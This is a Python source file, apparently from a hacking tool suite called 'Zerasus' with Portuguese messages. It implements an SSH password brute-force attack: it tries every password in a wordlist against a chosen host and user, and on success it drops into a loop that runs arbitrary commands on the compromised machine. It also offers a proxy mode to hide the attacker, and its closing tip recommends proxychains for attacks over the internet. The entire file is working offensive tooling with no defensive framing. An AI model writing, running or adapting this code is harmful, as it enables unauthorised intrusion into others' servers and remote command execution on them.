import paramiko
import pyChainedProxy
from proxyis import proxis
from colores import *
from time import sleep
from Zerasus import menu

try:
    select_option()
    select_proxymain()
    option = int(input('-> '))

    select_host()
    host = input(f"-> ")

    select_port()
    porta = int(input(f"-> "))

    select_username()
    user = input(f'-> ')

    select_wordlist()
    senhas = open(input('-> '))


    def ssh_no_proxy():

        for senha in senhas.readlines():
            try:
                fim = len(senha)
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, username=user, password=senha[0:fim - 1], port=porta)
                print(f"{color.CYAN}[+] Senha Correta >>> {senha}{color.END}")
                while True:
                    comando = input("Comando: ")
                    entrada, saida, erros = client.exec_command(comando)
                    print(saida.readlines())
                    print(erros.readlines())
            except paramiko.ssh_exception.AuthenticationException or paramiko.ssh_exception.SSHException:
                print(f"{color.RED}[ - ] Senha Errada: {senha}{color.END}")
        print(f"{color.PURPLE}[ - ]Senha nao encontrada! [ - ]{color.END}")
        sleep(4)
        menu()


    def ssh_proxyes():
        proxis()

        for senha in senhas:
            try:
                fim = len(senha)
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, username=user, password=senha[0:fim - 1], port=porta)
                print(f"{color.CYAN}[+] Senha Correta >>> {senha}{color.END}")
                while True:
                    comando = input("Comando: ")
                    entrada, saida, erros = client.exec_command(comando)
                    print(saida.readlines())
                    print(erros.readlines())
            except paramiko.ssh_exception.AuthenticationException or paramiko.ssh_exception.SSHException:
                print(f"{color.RED}[ - ] Senha Errada: {senha}{color.END}")
        print(f"{color.PURPLE}[ - ]Senha nao encontrada! [ - ]{color.END}")
        sleep(4)
        menu()

    if option == 1:
        ssh_no_proxy()
    elif option == 2:
        ssh_proxyes()
    else:
        print(f"{color.RED}Na proxima informe uma opcao!")
        sleep(3)
        print(f"De volta para o menu!{color.END}")
        sleep(2)
        menu()
except pyChainedProxy.Socks5Error:
    print(f"{color.RED}Dicas do Koc: Para ataques locais nao eh necessario proxy...\r\nPara ataques via Internet use proxychains.")
    sleep(3)
    print(f'De volta para o Menu!{color.END}')
    sleep(2)
    menu()
